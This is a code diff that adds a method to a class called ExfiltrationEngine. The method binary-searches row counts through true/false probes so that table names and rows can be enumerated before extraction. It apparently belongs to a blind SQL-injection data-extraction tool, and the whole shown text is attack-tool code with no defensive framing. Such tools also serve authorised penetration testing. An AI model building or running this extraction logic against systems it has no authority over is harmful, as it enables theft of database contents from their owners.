@@ -145,6 +145,32 @@ class ExfiltrationEngine:
         self.seq_predictor.learn_value(value)
         return self._finish(target, value, complete, length, truncated, undetermined)
 
+    # --------------------------------------------------------------- count
+    def discover_count(self, count_expr: str, max_count: int = 4096) -> Optional[int]:
+        """Binary-search the integer value of a COUNT(*) scalar expression.
+
+        Used to learn how many rows to enumerate (e.g. how many table names)
+        before extracting each. Returns None if a probe is undetermined.
+        """
+        self.oracle.ensure_classifier()
+        hi = max_count
+        if self._is_true(f"{count_expr} <= {hi}") is not True:
+            self.logger.error(f"count exceeds max_count={hi}")
+            return hi
+        lo = 0
+        while lo < hi:
+            mid = (lo + hi) // 2
+            res = self._is_true(f"{count_expr} <= {mid}")
+            if res is True:
+                hi = mid
+            elif res is False:
+                lo = mid + 1
+            else:
+                self.logger.error("count probe undetermined")
+                return None
+        self.logger.info(f"discovered count: {lo}")
+        return lo
+
     # --------------------------------------------------------------- length
     def _discover_length(self, target: Target) -> int:
         """Binary search the value length in [0, max_length]."""
